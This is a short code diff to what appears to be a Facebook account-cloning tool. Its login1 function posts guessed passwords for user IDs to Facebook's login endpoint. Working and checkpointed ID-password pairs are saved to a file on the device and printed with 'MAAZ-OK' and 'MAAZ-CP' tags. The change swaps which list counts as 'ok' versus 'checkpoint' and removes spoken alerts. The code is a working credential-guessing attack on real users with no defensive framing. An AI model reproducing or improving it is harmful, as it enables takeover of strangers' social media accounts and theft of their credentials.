@@ -442,17 +442,15 @@ def login1(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:
-                oks.append(uid)
+                cps.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                 print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw}\033[1;97m')
-                os.system('espeak -a 300 "OK ID Found"')
                 break
 
             elif "www.facebook.com" in rp['error']['message']:
-                cps.append(uid)
+                oks.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
-                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
-                os.system('espeak -a 300 "Checkpoint ID"')
+                print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')             
                 break
             else:continue
         loop+=1
